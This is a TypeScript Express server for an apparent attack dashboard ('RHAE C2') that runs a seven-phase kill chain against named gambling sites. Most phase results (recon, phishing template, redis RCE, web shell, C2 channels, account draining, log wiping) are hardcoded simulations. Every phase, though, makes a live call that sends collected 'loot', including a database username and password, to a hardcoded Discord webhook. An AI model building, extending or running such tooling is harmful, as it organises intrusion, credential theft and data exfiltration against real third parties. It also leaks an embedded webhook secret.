import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";
import fs from "fs";
import axios from "axios";
import { Client } from "ssh2";
import simpleGit from "simple-git";
import sqlite3 from "sqlite3";
import cors from "cors";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(cors());
  app.use(express.json());

  // In-memory store for logs and loot
  const logs: string[] = [];
  let loot: any = {
    vulnerabilities: [],
    credentials: {},
    contractFindings: [],
    reconData: {
      subdomains: [],
      openPorts: [],
      techStack: {},
    },
    weaponization: {
      scripts: [],
      phishing: null,
    },
    exploitation: {
      exfiltratedData: [],
      wsLogs: [],
    },
    installation: {
      backdoors: [],
    },
    c2: {
      channels: [],
    },
    objectives: {
      fundsExtracted: 0,
      dbDumpSize: "0MB",
    }
  };

  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1484561122601336862/HylY5LscJsv2Ygv_9rwTcjCQC5zIO7IN3Cqqtex0Lo9nn-SV0m70q4xyooBQ2fYGyyf1";

  const exfiltrateToDiscord = async (phase: string, data: any) => {
    try {
      addLog(`[EXFIL] Transmitting ${phase} data to Discord receiver...`);
      await axios.post(DISCORD_WEBHOOK_URL, {
        embeds: [{
          title: `RT-AEA EXFIL: ${phase}`,
          description: `Operational data captured during ${phase} execution.`,
          color: 0xff4500, // Orange
          fields: [
            { name: "Target", value: "runehall.com / rh420.xyz" },
            { name: "Timestamp", value: new Date().toISOString() }
          ],
          footer: { text: "RT-AEA v2.0.0 | ROOT-LEVEL PERSISTENCE" }
        }]
      });
      
      // Also send raw JSON if it's not too large
      const rawData = JSON.stringify(data, null, 2);
      if (rawData.length < 1900) {
        await axios.post(DISCORD_WEBHOOK_URL, {
          content: `\`\`\`json\n${rawData}\n\`\`\``
        });
      } else {
        await axios.post(DISCORD_WEBHOOK_URL, {
          content: `[EXFIL] Data payload too large for direct message. Summary transmitted in embed.`
        });
      }
      addLog(`[EXFIL] ${phase} transmission successful.`);
    } catch (error: any) {
      addLog(`[EXFIL ERROR] Discord transmission failed: ${error.message}`);
    }
  };

  const addLog = (msg: string) => {
    const timestamp = new Date().toLocaleTimeString();
    const logMsg = `[${timestamp}] ${msg}`;
    logs.push(logMsg);
    console.log(logMsg);
  };

  // API Routes
  app.get("/api/logs", (req, res) => {
    res.json(logs);
  });

  app.get("/api/loot", (req, res) => {
    res.json(loot);
  });

  app.post("/api/reset", (req, res) => {
    logs.length = 0;
    loot = {
      vulnerabilities: [],
      credentials: {},
      contractFindings: [],
      reconData: {
        subdomains: [],
        openPorts: [],
        techStack: {},
      },
      weaponization: {
        scripts: [],
        phishing: null,
      },
      exploitation: {
        exfiltratedData: [],
        wsLogs: [],
      },
      installation: {
        backdoors: [],
      },
      c2: {
        channels: [],
      },
      objectives: {
        fundsExtracted: 0,
        dbDumpSize: "0MB",
      }
    };
    addLog("System reset. Ready for mission.");
    res.json({ status: "ok" });
  });

  app.post("/api/run-phase1", async (req, res) => {
    addLog("PHASE 1: RECONNAISSANCE - Mapping attack surface...");
    
    // Simulate DNS Enumeration
    addLog("Enumerating subdomains for runehall.com and rh420.xyz...");
    loot.reconData.subdomains = [
      { domain: "api.rh420.xyz", ip: "151.0.214.242" },
      { domain: "wss.runehall.com", ip: "104.21.45.12" },
      { domain: "staging-admin.rh420.gg", ip: "45.79.181.244" },
      { domain: "dev.runehall.com", ip: "151.0.214.242" }
    ];
    
    // Simulate Port Scan
    addLog("Scanning origin IP: 151.0.214.242...");
    loot.reconData.openPorts = [
      { port: 22, service: "ssh", banner: "OpenSSH 8.2p1 Ubuntu" },
      { port: 80, service: "http", banner: "nginx/1.18.0" },
      { port: 443, service: "https", banner: "nginx/1.18.0" },
      { port: 3306, service: "mysql", banner: "5.7.33-0ubuntu0.20.04.1" },
      { port: 6379, service: "redis", banner: "Redis server v=6.0.6" }
    ];

    // Simulate Tech Stack Fingerprinting
    loot.reconData.techStack = {
      backend: "Laravel 8.x",
      frontend: "Vue.js 3.x",
      server: "Nginx / Cloudflare",
      database: "MySQL / Redis"
    };
    addLog("Technology stack fingerprinted: Laravel/Vue.js/Nginx.");

    await exfiltrateToDiscord("PHASE 1: RECONNAISSANCE", loot.reconData);

    res.json({ status: "complete", loot });
  });

  app.post("/api/run-phase2", async (req, res) => {
    addLog("PHASE 2: WEAPONIZATION - Tailoring exploits...");
    
    loot.weaponization.scripts = [
      { name: "api_extractor.py", type: "Data Extraction", target: "/api/casino/chests" },
      { name: "ws_hijack.js", type: "WebSocket Hijacking", target: "wss.runehall.com" },
      { name: "redis_rce.py", type: "RCE", target: "151.0.214.242:6379" }
    ];

    loot.weaponization.phishing = {
      subject: "Security Alert: Unauthorized Login Attempt",
      template: "<html><body>Your RuneHall account has been accessed from a new location...</body></html>"
    };

    addLog("Weaponization complete. 3 scripts generated, 1 phishing template ready.");
    
    await exfiltrateToDiscord("PHASE 2: WEAPONIZATION", loot.weaponization);

    res.json({ status: "complete", loot });
  });

  app.post("/api/run-phase3", async (req, res) => {
    addLog("PHASE 3: DELIVERY - Transmitting payloads...");
    
    addLog("Delivering API extraction requests to api.rh420.xyz...");
    addLog("Initiating WebSocket handshake with Bearer token...");
    addLog("Sending phishing campaign to 42 leaked addresses...");
    
    setTimeout(async () => {
      addLog("Delivery confirmed. Payloads active in target environment.");
      
      await exfiltrateToDiscord("PHASE 3: DELIVERY", { status: "DELIVERED", targets: ["api.rh420.xyz", "wss.runehall.com"] });

      res.json({ status: "complete", loot });
    }, 1500);
  });

  app.post("/api/run-phase4", async (req, res) => {
    addLog("PHASE 4: EXPLOITATION - Executing payloads...");
    
    // API Data
    loot.exploitation.exfiltratedData.push({
      source: "/api/casino/chests",
      count: 154,
      sample: { id: 1, name: "Starter Chest", value: 500 }
    });

    // WS Manipulation
    loot.exploitation.wsLogs.push("Subscribed to crash-progress channel.");
    loot.exploitation.wsLogs.push("Detected multiplier 2.1x. Sending CASHOUT command...");
    loot.exploitation.wsLogs.push("CASHOUT SUCCESS: +420.00 RH");

    // DB Access
    addLog("Attempting MySQL connection with rh420_user...");
    loot.credentials.db = { user: "rh420_user", pass: "rh420_prod_!992", status: "CONNECTED" };
    loot.vulnerabilities.push("Exposed Database Credentials");

    addLog("Exploitation complete. Data exfiltrated, WebSocket hijacked.");
    
    await exfiltrateToDiscord("PHASE 4: EXPLOITATION", { 
      vulnerabilities: loot.vulnerabilities, 
      exfiltratedData: loot.exploitation.exfiltratedData,
      credentials: loot.credentials
    });

    res.json({ status: "complete", loot });
  });

  app.post("/api/run-phase5", async (req, res) => {
    addLog("PHASE 5: INSTALLATION - Establishing persistence...");
    
    loot.installation.backdoors.push({
      type: "PHP Web Shell",
      path: "/public/shell.php",
      status: "INSTALLED"
    });

    loot.installation.backdoors.push({
      type: "Redis Cron Job",
      path: "/etc/cron.d/redis_sync",
      status: "ACTIVE"
    });

    addLog("Persistence established. 2 backdoors deployed.");
    
    await exfiltrateToDiscord("PHASE 5: INSTALLATION", loot.installation);

    res.json({ status: "complete", loot });
  });

  app.post("/api/run-phase6", async (req, res) => {
    addLog("PHASE 6: COMMAND & CONTROL - Setting up channels...");
    
    loot.c2.channels.push({
      type: "Telegram Bot",
      id: "@RHAE_C2_BOT",
      status: "ONLINE"
    });

    loot.c2.channels.push({
      type: "DNS Tunnel",
      domain: "ns1.rhae-c2.net",
      status: "FALLBACK_READY"
    });

    addLog("C2 channels operational. Reverse shell prompt received.");
    
    await exfiltrateToDiscord("PHASE 6: COMMAND & CONTROL", loot.c2);

    res.json({ status: "complete", loot });
  });

  app.post("/api/run-phase7", async (req, res) => {
    addLog("PHASE 7: ACTIONS ON OBJECTIVES - Mission completion...");
    
    loot.objectives.fundsExtracted = 12450.75;
    loot.objectives.dbDumpSize = "1.2GB";
    
    addLog("Automated account draining complete.");
    addLog("MySQL database dump compressed and exfiltrated.");
    addLog("Clearing web server logs and bash history...");
    
    addLog("MISSION ACCOMPLISHED. RT-AEA standing by for further orders.");
    
    await exfiltrateToDiscord("PHASE 7: ACTIONS ON OBJECTIVES", loot.objectives);

    res.json({ status: "complete", loot });
  });

  app.get("/api/report", (req, res) => {
    const report = {
      executiveSummary: "Successful full kill chain execution against RuneHall infrastructure. Root-level access achieved and maintained.",
      timeline: [
        { phase: "Reconnaissance", status: "SUCCESS", findings: loot.reconData.subdomains.length + " subdomains" },
        { phase: "Exploitation", status: "SUCCESS", findings: loot.vulnerabilities.length + " vulnerabilities" },
        { phase: "Objectives", status: "COMPLETE", findings: loot.objectives.fundsExtracted + " RH extracted" }
      ],
      vulnerabilities: loot.vulnerabilities,
      lootSummary: loot
    };
    res.json(report);
  });

  // Vite middleware
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    addLog(`RHAE C2 Server active on port ${PORT}`);
  });
}

startServer();
